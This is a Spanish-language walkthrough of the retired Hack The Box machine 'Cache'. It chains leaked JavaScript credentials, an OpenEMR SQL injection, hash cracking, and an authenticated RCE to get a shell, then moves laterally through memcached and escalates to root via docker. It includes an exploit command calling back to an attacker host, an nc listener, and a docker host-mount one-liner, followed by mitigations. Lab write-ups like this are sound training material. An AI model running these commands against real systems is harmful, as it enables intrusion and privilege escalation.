---
machine: Cache
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, openemr, sqli, memcached, docker]
---

# Cache — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web filtra credenciales en JavaScript y un vhost oculto aloja OpenEMR. Un bypass de autenticación en el portal da acceso a una página con SQLi, de la que sale un hash bcrypt de administrador. Con esas credenciales se explota una RCE autenticada de OpenEMR, se reutiliza la contraseña para `luffy` y se lee memcached para el siguiente usuario. El grupo `docker` permite montar el host y ser root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,2201 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 18.04, `80/tcp` Apache y `2201/tcp` un segundo SSH.
- El sitio `cache.htb` contiene JavaScript con usuario y contraseña embebidos.
- `wfuzz` de vhosts descubre `hms.htb`, que sirve OpenEMR.

## Enumeración

- El portal de pacientes de OpenEMR permite registrarse y luego acceder a `add_edit_event_user.php` sin autenticación completa.
- El parámetro `eid` es inyectable y `sqlmap` extrae la tabla de usuarios.
- El hash de `openemr_admin` es bcrypt y se crackea con `hashcat -m 3200`.

## Foothold

Con la contraseña de `openemr_admin` se usa el exploit autenticado de OpenEMR (EDB) para escribir un PHP y obtener una shell como `www-data`.

```bash
hashcat -m 3200 openemr_admin.hash rockyou.txt
python3 28408.rb http://hms.htb <USER> <PASSWORD> <ATTACKER> 443
nc -lnvp 443
```

## Movimiento lateral

La contraseña de la web se reutiliza para `luffy` por SSH. `luffy` puede leer memcached en `localhost:11211`; la clave `password` contiene las credenciales de otro usuario, que se usa para `su`.

## Escalada de privilegios

El segundo usuario pertenece al grupo `docker`. Se monta `/` del host en un contenedor y se escribe una clave o se lee la flag directamente.

```bash
id
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Evidencia

- Credenciales en JavaScript y vhost `hms.htb`.
- Hash bcrypt crackeado y shell como `www-data`.
- Clave de memcached y `docker run -v /:/mnt` como root.

## Lecciones aprendidas

- Las credenciales embebidas en JavaScript suelen reutilizarse en SSH.
- Un bypass de autenticación convierte una SQLi en una cadena completa.
- Pertenecer al grupo `docker` equivale a root en el host.

## Mitigación y detección

- No incrustar credenciales en el frontend y rotarlas.
- Actualizar OpenEMR y restringir el portal.
- Quitar usuarios del grupo `docker` y auditar montajes privilegiados.

## Referencias

- [0xdf — Cache](https://0xdf.gitlab.io/2020/10/10/htb-cache.html)
- [IppSec — Cache](https://www.youtube.com/watch?v=kfLU5-Eeyhw)
- [Hack The Box — Cache](https://app.hackthebox.com/machines/cache)
